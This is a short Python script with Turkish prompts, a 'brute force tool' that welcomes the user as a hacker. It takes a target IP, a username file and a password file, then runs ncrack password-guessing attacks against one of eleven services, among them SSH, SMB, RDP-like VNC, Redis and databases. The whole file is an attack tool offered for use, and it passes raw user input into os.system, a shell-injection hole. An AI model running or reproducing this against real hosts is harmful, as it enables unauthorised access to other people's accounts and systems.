#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet KABA KUVVET")
print("""
Kaba Kuvvet Aracına Hoş Geldin Hacker : )

1)  FTP
2)  SSH
3)  Telnet
4)  HTTP
5)  SMB
6)  SMTP
7)  SIP
8)  Redis
9)  VNC
10) PostgreSQL
11) MySQL

""")

islemno = input("İşlem Numarası Girin : ")
hedefip = input("Hedef IP Girin : ")
kullaniciadi = input("Kullanıcı Adı Dosya Yolu : ")
sifre = input("Sifrelerin Bulunduğu Dosya Yolu : ")

if(islemno=="1"):
	os.system("ncrack -p 21 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="2"):
	os.system("ncrack -p 22 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="3"):
	os.system("ncrack -p 23 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="4"):
	os.system("ncrack -p 80 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="5"):
	os.system("ncrack -p 445 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="6"):
	os.system("ncrack -p 587 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="7"):
	os.system("ncrack -p 5061 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="8"):
	os.system("ncrack -p 6379 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="9"):
	os.system("ncrack -p 5900 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="10"):
	os.system("ncrack -p 5432 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
elif(islemno=="11"):
	os.system("ncrack -p 3306 -u " + kullaniciadi + " -P " + sifre + " "+hedefip)
else:
	print("Hatalı seçim yaptınız!")	
